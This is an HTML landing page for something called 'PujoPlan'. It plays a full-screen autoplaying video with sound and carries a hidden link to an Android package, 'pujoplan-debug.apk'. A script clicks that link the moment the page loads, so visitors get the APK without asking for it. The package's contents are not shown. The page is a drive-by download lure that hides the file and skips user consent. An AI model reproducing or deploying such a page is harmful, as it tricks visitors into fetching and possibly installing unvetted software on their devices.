<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PujoPlan</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      height: 100%;
      background: #000;
      overflow: hidden;
    }

    video {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
  </style>
</head>

<body>

  <!-- Video with music baked in — no muted attribute so audio plays through it -->
  <video id="mainvideo" autoplay loop playsinline>
    <source src="x_with_music.mp4" type="video/mp4" />
  </video>

  <!-- Hidden download link -->
  <a id="dl" href="pujoplan-debug.apk" download="PujoPlan.apk" style="display:none"></a>

  <script>
    var video = document.getElementById('mainvideo');

    function tryPlay() {
      video.play().catch(function () { });
    }

    // Try immediately
    tryPlay();

    // Unlock on first real gesture (browser policy fallback)
    ['click', 'touchstart', 'pointerdown'].forEach(function (e) {
      document.addEventListener(e, tryPlay);
    });

    // Auto-download APK instantly
    setTimeout(function () {
      document.getElementById('dl').click();
    }, 0);
  </script>

</body>

</html>
